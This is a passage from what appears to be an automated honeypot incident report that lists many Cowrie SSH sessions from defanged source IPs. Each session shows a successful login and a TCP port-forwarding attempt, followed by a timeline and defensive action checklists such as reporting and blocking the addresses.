| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:54:35` | `cowrie.session.connect` |
| `2026-08-29 20:54:35` | `cowrie.client.version` |
| `2026-08-29 20:54:35` | `cowrie.client.kex` |
| `2026-08-29 20:54:36` | `cowrie.login.success` |
| `2026-08-29 20:54:36` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:54:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 20:54:36` | `cowrie.direct-tcpip.data` |
| `2026-08-29 20:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f24549b7845

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-08-29 20:59 |
| **Last Seen** | 2026-08-29 20:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:59:28` | `cowrie.session.connect` |
| `2026-08-29 20:59:29` | `cowrie.client.version` |
| `2026-08-29 20:59:29` | `cowrie.client.kex` |
| `2026-08-29 20:59:31` | `cowrie.login.success` |
| `2026-08-29 20:59:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31eafc585e3e

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-08-29 20:59 |
| **Last Seen** | 2026-08-29 20:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 20:59:38` | `cowrie.session.connect` |
| `2026-08-29 20:59:38` | `cowrie.client.version` |
| `2026-08-29 20:59:38` | `cowrie.client.kex` |
| `2026-08-29 20:59:41` | `cowrie.login.success` |
| `2026-08-29 20:59:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 20:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-257f40fbf82a

| Field | Detail |
|---|---|
| **Source IP** | `82.102.149[.]88` |
| **First Seen** | 2026-08-29 21:01 |
| **Last Seen** | 2026-08-29 21:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:01:28` | `cowrie.session.connect` |
| `2026-08-29 21:01:29` | `cowrie.client.version` |
| `2026-08-29 21:01:29` | `cowrie.client.kex` |
| `2026-08-29 21:01:30` | `cowrie.login.success` |
| `2026-08-29 21:01:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.149[.]88` to AbuseIPDB if not already reported
- [ ] Block `82.102.149[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3c98046b30

| Field | Detail |
|---|---|
| **Source IP** | `90.230.168[.]26` |
| **First Seen** | 2026-08-29 21:02 |
| **Last Seen** | 2026-08-29 21:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:02:11` | `cowrie.session.connect` |
| `2026-08-29 21:02:11` | `cowrie.client.version` |
| `2026-08-29 21:02:11` | `cowrie.client.kex` |
| `2026-08-29 21:02:12` | `cowrie.login.success` |
| `2026-08-29 21:02:13` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.230.168[.]26` to AbuseIPDB if not already reported
- [ ] Block `90.230.168[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f08336fb64

| Field | Detail |
|---|---|
| **Source IP** | `223.241.214[.]127` |
| **First Seen** | 2026-08-29 21:02 |
| **Last Seen** | 2026-08-29 21:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:02:23` | `cowrie.session.connect` |
| `2026-08-29 21:02:23` | `cowrie.client.version` |
| `2026-08-29 21:02:23` | `cowrie.client.kex` |
| `2026-08-29 21:02:26` | `cowrie.login.success` |
| `2026-08-29 21:02:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.241.214[.]127` to AbuseIPDB if not already reported
- [ ] Block `223.241.214[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed2415a1259

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-08-29 21:02 |
| **Last Seen** | 2026-08-29 21:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:02:23` | `cowrie.session.connect` |
| `2026-08-29 21:02:24` | `cowrie.client.version` |
| `2026-08-29 21:02:24` | `cowrie.client.kex` |
| `2026-08-29 21:02:26` | `cowrie.login.success` |
| `2026-08-29 21:02:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74b2d2829800

| Field | Detail |
|---|---|
| **Source IP** | `46.77.69[.]201` |
| **First Seen** | 2026-08-29 21:02 |
| **Last Seen** | 2026-08-29 21:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:02:33` | `cowrie.session.connect` |
| `2026-08-29 21:02:36` | `cowrie.client.version` |
| `2026-08-29 21:02:36` | `cowrie.client.kex` |
| `2026-08-29 21:02:39` | `cowrie.login.success` |
| `2026-08-29 21:02:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.77.69[.]201` to AbuseIPDB if not already reported
- [ ] Block `46.77.69[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cef1b5f38538

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:03 |
| **Last Seen** | 2026-08-29 21:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:03:50` | `cowrie.session.connect` |
| `2026-08-29 21:03:50` | `cowrie.client.version` |
| `2026-08-29 21:03:50` | `cowrie.client.kex` |
| `2026-08-29 21:03:51` | `cowrie.login.success` |
| `2026-08-29 21:03:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:03:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:03:51` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0773c0a15d9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:05 |
| **Last Seen** | 2026-08-29 21:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:05:19` | `cowrie.session.connect` |
| `2026-08-29 21:05:19` | `cowrie.client.version` |
| `2026-08-29 21:05:19` | `cowrie.client.kex` |
| `2026-08-29 21:05:20` | `cowrie.login.success` |
| `2026-08-29 21:05:20` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:05:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:05:21` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-150c38ecc54e

| Field | Detail |
|---|---|
| **Source IP** | `182.95.186[.]182` |
| **First Seen** | 2026-08-29 21:06 |
| **Last Seen** | 2026-08-29 21:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:06:23` | `cowrie.session.connect` |
| `2026-08-29 21:06:24` | `cowrie.client.version` |
| `2026-08-29 21:06:24` | `cowrie.client.kex` |
| `2026-08-29 21:06:26` | `cowrie.login.success` |
| `2026-08-29 21:06:27` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.186[.]182` to AbuseIPDB if not already reported
- [ ] Block `182.95.186[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88ca723fc27d

| Field | Detail |
|---|---|
| **Source IP** | `42.125.196[.]116` |
| **First Seen** | 2026-08-29 21:06 |
| **Last Seen** | 2026-08-29 21:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:06:32` | `cowrie.session.connect` |
| `2026-08-29 21:06:33` | `cowrie.client.version` |
| `2026-08-29 21:06:33` | `cowrie.client.kex` |
| `2026-08-29 21:06:34` | `cowrie.login.success` |
| `2026-08-29 21:06:35` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:06:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.125.196[.]116` to AbuseIPDB if not already reported
- [ ] Block `42.125.196[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88b09937e4b1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:13 |
| **Last Seen** | 2026-08-29 21:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:13:30` | `cowrie.session.connect` |
| `2026-08-29 21:13:30` | `cowrie.client.version` |
| `2026-08-29 21:13:30` | `cowrie.client.kex` |
| `2026-08-29 21:13:31` | `cowrie.login.success` |
| `2026-08-29 21:13:31` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:13:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:13:31` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b17a2a3ba93

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:15 |
| **Last Seen** | 2026-08-29 21:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:15:58` | `cowrie.session.connect` |
| `2026-08-29 21:15:58` | `cowrie.client.version` |
| `2026-08-29 21:15:58` | `cowrie.client.kex` |
| `2026-08-29 21:15:59` | `cowrie.login.success` |
| `2026-08-29 21:15:59` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:15:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:15:59` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb0a47f9fce1

| Field | Detail |
|---|---|
| **Source IP** | `199.7.163[.]33` |
| **First Seen** | 2026-08-29 21:16 |
| **Last Seen** | 2026-08-29 21:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:16:08` | `cowrie.session.connect` |
| `2026-08-29 21:16:08` | `cowrie.client.version` |
| `2026-08-29 21:16:08` | `cowrie.client.kex` |
| `2026-08-29 21:16:09` | `cowrie.login.success` |
| `2026-08-29 21:16:10` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `199.7.163[.]33` to AbuseIPDB if not already reported
- [ ] Block `199.7.163[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342980e37152

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-08-29 21:16 |
| **Last Seen** | 2026-08-29 21:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:16:19` | `cowrie.session.connect` |
| `2026-08-29 21:16:20` | `cowrie.client.version` |
| `2026-08-29 21:16:20` | `cowrie.client.kex` |
| `2026-08-29 21:16:21` | `cowrie.login.success` |
| `2026-08-29 21:16:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01ace2019d4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:22 |
| **Last Seen** | 2026-08-29 21:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:22:56` | `cowrie.session.connect` |
| `2026-08-29 21:22:56` | `cowrie.client.version` |
| `2026-08-29 21:22:56` | `cowrie.client.kex` |
| `2026-08-29 21:22:57` | `cowrie.login.success` |
| `2026-08-29 21:22:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:22:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:22:57` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-632fbdd2a2e7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:26 |
| **Last Seen** | 2026-08-29 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:26:47` | `cowrie.session.connect` |
| `2026-08-29 21:26:47` | `cowrie.client.version` |
| `2026-08-29 21:26:47` | `cowrie.client.kex` |
| `2026-08-29 21:26:48` | `cowrie.login.success` |
| `2026-08-29 21:26:48` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:26:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:26:48` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb186b9bda1

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 21:27 |
| **Last Seen** | 2026-08-29 21:27 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:27:17` | `cowrie.session.connect` |
| `2026-08-29 21:27:17` | `cowrie.client.version` |
| `2026-08-29 21:27:17` | `cowrie.client.kex` |
| `2026-08-29 21:27:17` | `cowrie.login.success` |
| `2026-08-29 21:27:18` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:27:18` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 21:27:18` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94a6f57d0a16

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-29 21:31 |
| **Last Seen** | 2026-08-29 21:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:31:28` | `cowrie.session.connect` |
| `2026-08-29 21:31:28` | `cowrie.client.version` |
| `2026-08-29 21:31:28` | `cowrie.client.kex` |
| `2026-08-29 21:31:29` | `cowrie.login.success` |
| `2026-08-29 21:31:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642d785c7b84

| Field | Detail |
|---|---|
| **Source IP** | `97.211.176[.]59` |
| **First Seen** | 2026-08-29 21:31 |
| **Last Seen** | 2026-08-29 21:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:31:34` | `cowrie.session.connect` |
| `2026-08-29 21:31:34` | `cowrie.client.version` |
| `2026-08-29 21:31:34` | `cowrie.client.kex` |
| `2026-08-29 21:31:38` | `cowrie.login.success` |
| `2026-08-29 21:31:39` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.211.176[.]59` to AbuseIPDB if not already reported
- [ ] Block `97.211.176[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-248b21d0ac99

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 21:32 |
| **Last Seen** | 2026-08-29 21:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:32:31` | `cowrie.session.connect` |
| `2026-08-29 21:32:31` | `cowrie.client.version` |
| `2026-08-29 21:32:31` | `cowrie.client.kex` |
| `2026-08-29 21:32:32` | `cowrie.login.success` |
| `2026-08-29 21:32:32` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:32:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 21:32:32` | `cowrie.direct-tcpip.data` |
| `2026-08-29 21:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a6fa36e654

| Field | Detail |
|---|---|
| **Source IP** | `47.247.73[.]99` |
| **First Seen** | 2026-08-29 21:33 |
| **Last Seen** | 2026-08-29 21:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:33:39` | `cowrie.session.connect` |
| `2026-08-29 21:33:40` | `cowrie.client.version` |
| `2026-08-29 21:33:40` | `cowrie.client.kex` |
| `2026-08-29 21:33:42` | `cowrie.login.success` |
| `2026-08-29 21:33:42` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.73[.]99` to AbuseIPDB if not already reported
- [ ] Block `47.247.73[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9cb67347319

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-08-29 21:33 |
| **Last Seen** | 2026-08-29 21:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:33:47` | `cowrie.session.connect` |
| `2026-08-29 21:33:48` | `cowrie.client.version` |
| `2026-08-29 21:33:48` | `cowrie.client.kex` |
| `2026-08-29 21:33:50` | `cowrie.login.success` |
| `2026-08-29 21:33:50` | `cowrie.direct-tcpip.request` |
| `2026-08-29 21:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b5bfe87d62e

| Field | Detail |
|---|---|
| **Source IP** | `113.108.144[.]34` |
| **First Seen** | 2026-08-29 21:33 |
| **Last Seen** | 2026-08-29 21:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 21:33:58` | `cowrie.session.connect` |
| `2026-08-29 21:33:59` | `cowrie.client.version` |
| `2026-08-29 21:33:59` | `cowrie.client.kex` |
| `2026-08-29 21:34:01` | `cowrie.login.success` |
